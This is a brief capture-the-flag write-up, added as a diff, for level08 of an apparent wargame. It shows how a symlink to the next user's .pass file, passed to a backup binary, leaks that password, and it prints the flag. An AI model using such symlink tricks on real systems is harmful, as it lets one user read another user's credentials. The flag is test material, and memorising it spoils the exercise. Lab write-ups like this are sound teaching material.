@@ -1,0 +1,40 @@
+level08
+
+----- CAT -----
+
+LOG: %s
+Usage: %s filename
+./backups/.log
+ERROR: Failed to open %s
+Starting back up:
+./backups/
+ERROR: Failed to open %s%s
+Finished back up
+
+----- LS - EXEC -----
+
+we have a backups folder with a .log file
+we can run it but do nothing
+note that When we pass a file, he will wrote inside the file in the .log, and if it succeed,
+he will copy the file in backups
+
+----- GDB -----
+
+With gdb we can see that is a x64 bynary, 
+
+For this level, we have a x64 binary
+we can see a open function the program read a file
+
+
+So i try to put a symbolic link to the .pass of the level09, pass the link
+to the bin, and we have the flag in the backups folder.
+
+level08@OverRide:~$ chmod 777 .
+level08@OverRide:~$ ln -s /home/users/level09/.pass nextlevel
+level08@OverRide:~$ ./level08 nextlevel
+level08@OverRide:~$ cat backups/nextlevel
+fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S
+
+----- FLAG -----
+
+fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S
